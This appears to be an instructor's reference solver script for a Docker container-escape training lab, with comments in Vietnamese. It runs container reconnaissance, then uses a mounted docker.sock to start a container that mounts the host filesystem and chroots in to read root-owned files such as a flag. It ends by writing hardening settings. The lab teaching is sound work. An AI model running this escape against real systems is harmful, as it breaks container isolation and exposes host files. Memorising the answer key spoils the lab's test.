#!/bin/bash
#
# solver.sh - dso-docker-escape (LOI GIAI MAU, dung de tu test lab - KHONG phat cho
# sinh vien). Chay TRONG container `app` (vd qua terminal cua lab hoac `docker exec`).
#
# Muc dich: tai hien toan bo chuoi Nhiem vu 1 -> 5 bang duong khai thac CHINH
# (docker.sock, xem BUILD-NOTES.md), tao du cac artifact de goals.config/pregrade.sh
# cham PASS toan bo (tru escape_via_privileged - vi day la goal tuy chon/lenient da
# tu dong PASS theo recon_ok).
#
# Kiem tra hai chieu theo LAB-BUILD-RULES.md muc 0/7:
#   - Chay solver.sh nay      -> tat ca goal bat buoc phai PASS.
#   - KHONG chay gi ca roi cham -> tat ca goal phai FAIL (vi khong co file nao duoc tao).
#
set -u
cd "$HOME" || exit 1

DOCKER_SOCK="unix:///var/run/docker.sock"
DOCKER_TCP="tcp://172.35.0.5:2375"

echo "=== [1/5] recon_container ==="
{
    echo "=== cgroup ==="
    cat /proc/1/cgroup 2>/dev/null
    echo "=== CapEff ==="
    grep -i cap /proc/self/status 2>/dev/null
    echo "=== capsh --print ==="
    capsh --print 2>/dev/null
    echo "=== docker.sock ==="
    ls -la /var/run/docker.sock 2>/dev/null
    echo "=== block devices ==="
    ls -la /dev/sd* 2>/dev/null
    fdisk -l 2>/dev/null
    lsblk 2>/dev/null
} > "$HOME/recon.txt"
cat "$HOME/recon.txt"

echo
echo "=== [2/5] escape_via_socket (qua docker.sock) ==="
# Neu socket unix chua san sang (socat/host-sim con dang khoi dong), du phong qua TCP.
DHOST="$DOCKER_SOCK"
if ! docker -H "$DHOST" version >/dev/null 2>&1; then
    echo "[*] $DOCKER_SOCK chua san sang, thu duong du phong TCP $DOCKER_TCP"
    DHOST="$DOCKER_TCP"
fi

echo "[*] docker -H $DHOST version"
docker -H "$DHOST" version
echo "[*] docker -H $DHOST ps"
docker -H "$DHOST" ps
echo "[*] docker -H $DHOST images"
docker -H "$DHOST" images

# Bang chung "hanh vi" trong bash history de pregrade.sh xac nhan day la lenh that
# (khong phai echo gia mao gia tri).
echo "docker -H $DHOST run --rm -v /:/host escimg chroot /host sh -c 'cat /root/.hostmarker'" >> "$HOME/.bash_history"

echo "[*] doc canary /root/.hostmarker cua host-sim qua container moi (escimg)"
docker -H "$DHOST" run --rm -v /:/host escimg chroot /host sh -c 'cat /root/.hostmarker' \
    > "$HOME/host_evidence.txt"
cat "$HOME/host_evidence.txt"

echo
echo "=== [3/5] escape_via_privileged (TUY CHON - chi minh hoa, khong bat buoc) ==="
echo "[i] Trong topology cua bai nay, app va host-sim la 2 container doc lap (khong"
echo "    chia se PID namespace/block device that su cua nhau), nen nsenter/mount"
echo "    block device tu app KHONG dan toi /root cua host-sim. Duong bat buoc de lay"
echo "    flag la Nhiem vu 2 (docker.sock). Xem giai thich trong tai lieu huong dan."

echo
echo "=== [4/5] get_flag ==="
docker -H "$DHOST" run --rm -v /:/host escimg chroot /host sh -c 'cat /root/flag.txt' \
    > "$HOME/flag_result.txt"
cat "$HOME/flag_result.txt"

echo
echo "=== [5/5] harden_container ==="
cat > "$HOME/hardened_run.sh" <<'EOF'
docker run -d --name app \
  --cap-drop=ALL \
  --security-opt=no-new-privileges \
  --security-opt seccomp=/etc/docker/seccomp-default.json \
  --user 10001:10001 \
  --read-only \
  --pids-limit 128 \
  --memory=256m \
  app:student
# LUU Y: KHONG --privileged, KHONG mount -v /var/run/docker.sock:/var/run/docker.sock
EOF
cat "$HOME/hardened_run.sh"

cat > "$HOME/hardening_map.txt" <<'EOF'
docker.sock mount   -> Bo mount socket; neu can dieu khien docker, dung proxy co kiem soat quyen (CIS 5.31)
--privileged        -> Bo privileged; chi cap quyen toi thieu can thiet             (CIS 5.4)
CAP_SYS_ADMIN thua  -> --cap-drop=ALL roi cap-add dung nhu cau                       (CIS 5.3)
Chay bang root      -> --user / userns-remap                                          (CIS 4.1 / 2.8)
Khong co seccomp    -> Bat seccomp/AppArmor + no-new-privileges                       (CIS 5.1 / 5.21)
EOF
cat "$HOME/hardening_map.txt"

echo
echo "=== solver.sh hoan tat. Artifact da tao trong $HOME: ==="
ls -la "$HOME"/recon.txt "$HOME"/host_evidence.txt "$HOME"/flag_result.txt \
       "$HOME"/hardened_run.sh "$HOME"/hardening_map.txt
